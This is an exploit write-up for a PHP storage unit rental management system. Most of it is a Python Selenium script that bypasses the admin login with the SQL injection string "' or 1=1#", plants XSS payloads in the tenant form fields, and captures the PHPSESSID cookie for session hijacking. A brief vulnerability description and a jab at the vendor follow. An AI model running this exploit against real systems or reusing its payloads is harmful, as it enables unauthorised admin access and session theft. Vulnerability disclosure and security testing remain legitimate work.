### Exploit Title: SURMS - PHP (by: oretnom23 ) v1.0 is vulnerable from remote SQL-Injection-Bypass-Authentication and XSS PWNED PHPSESSID Hijacking.
### Author: nu11secur1ty
### Testing and Debugging: nu11secur1ty 
### Date: 09.07.2021
### Vendor: https://www.sourcecodester.com/user/257130/activity
### Link: https://www.sourcecodester.com/php/14932/storage-unit-rental-management-system-using-php-free-source-code.html
### CVE: CVE-nu11-08

[+] Exploit Source: 

#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug and Developement: @nu11secur1ty 
# CVE-nu11-08

from selenium import webdriver
import time
import os
from colorama import init, Fore, Back, Style
init(convert=True)


#enter the link to the website you want to automate login.
### 0
website_link0="http://localhost/storage/admin/login.php"

#enter your login username
username0="nu11secur1ty' or 1=1#"

#enter your login password
password0="nu11secur1ty' or 1=1#"

#enter the element for username input field
element_for_username0="username"
#enter the element for password input field
element_for_password0="password"

browser = webdriver.Chrome()
browser.get((website_link0))	


try:
	### 0
	username_element = browser.find_element_by_name(element_for_username0)
	username_element.send_keys(username0)		
	password_element  = browser.find_element_by_name(element_for_password0)
	password_element.send_keys(password0)
	browser.maximize_window()
	time.sleep(1)
	browser.execute_script("document.querySelector('[class=\"btn btn-primary btn-block\"]').click()")
	
	time.sleep(1)
	exploit_link="http://localhost/storage/admin/?page=tenants"
	browser.get((exploit_link))
	
	browser.execute_script("document.querySelector('[class=\"btn btn-flat btn-primary\"]').click()")
	time.sleep(3)
	# Exploit XSS
	browser.execute_script("document.querySelector('[name=\"fullname\"]').value=\"<script>alert(document.cookie)</script>\"")
	browser.execute_script("document.querySelector('[name=\"address\"]').value=\"<script>alert(document.cookie)</script>\"")
	
	time.sleep(1)
	browser.execute_script("document.querySelector('[id=\"submit\"]').click()")
	
	coockie=browser.execute_script("return document.cookie")
	coockie=coockie.split("=")[1]
	print(coockie)
	browser.close()
	
	os.system("python system.py")
	time.sleep(3)
	os.system("python PWNPHPSESSID.py " + coockie)
	
	
	print(Fore.RED + 'The payload for CVE-nu11-08 is deployed and your admin account is PWNED by SQL - Injection\n')
	print(Fore.RED + 'And a second time from PWNED Hijacking PHPSESSID...\n')
	
	print(Style.RESET_ALL)
	
except Exception:
	#### This exception occurs if the element are not found in the webpage.
	print("Some error occured :(")

------------------------------------------------------------------

### Description:
The SURMS - PHP (by: oretnom23 ) v1.0 is vulnerable from remote SQL-Injection-Bypass-Authentication for the admin account and XSS PWNED PHPSESSID Hijacking in app "tenants" and for MySQL /storage/classes/Login.php. 
remote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. 
The parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. 
When the user will sending a malicious query or malicious payload to the MySQL server for those three accounts, he can bypass the login credentials and take control of these accounts.
And the second time he can access the admin account by using the PHPSESSID Hijacking technique.

-------------------------------------------------------------------
### CONCLUSION: This vendor must STOP creating all these broken projects and vulnerable software programs, probably he is not a developer!

### BR 
- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer

-------------------------------------------------------------------
### Reproduce: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-08-09072021
### Proof: https://streamable.com/9efynl
### BR nu11secur1ty
